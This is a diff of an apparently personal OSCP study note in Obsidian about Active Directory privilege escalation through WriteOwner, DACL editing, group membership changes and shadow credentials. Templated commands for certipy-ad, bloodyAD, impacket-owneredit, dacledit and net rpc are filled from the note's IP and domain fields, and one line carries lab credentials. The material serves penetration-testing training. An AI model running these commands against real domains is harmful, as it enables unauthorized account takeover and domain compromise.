@@ -25,7 +25,7 @@ $SecPassword = ConvertTo-SecureString "pass123!" -AsPlainText -Force Set-ADAccou
 EvilwinRM into their new creds
 
 ---
-# Write-Owner
+# WriteOwner (User)
 
 As the owner of a user, I could add a shadow credential:
 ```dataviewjs
@@ -38,7 +38,7 @@ const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [a
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 Make this target account owned by our account first.
-## Change Account Owner
+#### Change Account Owner
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -49,7 +49,7 @@ const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p 
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-## Give GenericAll
+#### Give GenericAll
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -61,6 +61,63 @@ const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
+# WriteOwner (Group)
+
+Add user to this group
+#### Modify owner
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-owneredit -action write -new-owner [adminUser] -target [groupName] ${discoveredDomain}/[adminUser]:[adminPW] -dc-ip ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+#### Modify Rights
+dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.4
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal [adminUser] -target [groupName] '${discoveredDomain}'/'[adminUser]':'[adminPW]' -dc-ip ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+#### Add to group
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `net rpc group addmem [group] [adminUser] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+#### Check group members
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `net rpc group members [group] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+# Shadow Credentials
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ## Abuse the `Account Operators` permissions
 
 Add an account into this vulnerable group using `GenericAll` to progress to the next step
